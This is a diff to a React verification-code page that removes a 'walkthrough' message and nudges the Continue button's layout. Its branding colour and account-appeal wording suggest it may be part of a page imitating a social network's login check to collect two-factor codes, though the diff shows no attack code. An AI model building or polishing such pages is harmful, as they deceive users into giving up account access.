@@ -67,7 +67,6 @@ const Verify = () => {
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
                 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
-            walkthrough: "We'll walk you through some steps to secure and unlock your account.",
             submit: 'Continue',
             sendCode: 'Send new code',
             errorMessage: 'The verification code you entered is incorrect',
@@ -88,7 +87,6 @@ const Verify = () => {
                     translatedPlaceholder,
                     translatedInfoTitle,
                     translatedInfoDesc,
-                    translatedWalkthrough,
                     translatedSubmit,
                     translatedSendCode,
                     translatedError,
@@ -100,7 +98,6 @@ const Verify = () => {
                     translateText(defaultTexts.placeholder, targetLang),
                     translateText(defaultTexts.infoTitle, targetLang),
                     translateText(defaultTexts.infoDescription, targetLang),
-                    translateText(defaultTexts.walkthrough, targetLang),
                     translateText(defaultTexts.submit, targetLang),
                     translateText(defaultTexts.sendCode, targetLang),
                     translateText(defaultTexts.errorMessage, targetLang),
@@ -114,7 +111,6 @@ const Verify = () => {
                     placeholder: translatedPlaceholder,
                     infoTitle: translatedInfoTitle,
                     infoDescription: translatedInfoDesc,
-                    walkthrough: translatedWalkthrough,
                     submit: translatedSubmit,
                     sendCode: translatedSendCode,
                     errorMessage: translatedError,
@@ -211,10 +207,10 @@ const Verify = () => {
                         <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                     </div>
                 </div>
-                <p>{translatedTexts.walkthrough}</p>
 
+                {/* Nút Continue đã được kéo lên gần hơn */}
                 <button
-                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400'
+                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
                     onClick={handleSubmit}
                     disabled={isLoading || !code.trim()}
                 >
